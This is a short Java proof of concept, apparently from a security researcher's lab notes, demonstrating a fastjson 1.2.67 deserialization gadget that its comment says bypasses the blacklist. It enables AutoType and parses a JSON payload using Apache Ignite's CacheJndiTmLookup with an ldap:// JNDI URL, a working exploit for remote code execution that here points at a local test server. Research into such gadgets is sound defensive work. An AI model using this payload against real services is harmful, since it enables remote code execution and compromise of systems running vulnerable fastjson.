package com.mechoy;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * Author  Mechoy
 * Version 1.0
 * Date    2023/5/8
 * Description fastjson 1.2.67不在黑名单的链子
 */
public class fastjsonTest2 {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String s = "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"JndiNames\":[\"ldap://127.0.0.1:8888/BvdpLNnZ\"],\"$ref\":\"$.Tm\"}";
        JSON.parseObject(s);
    }
}
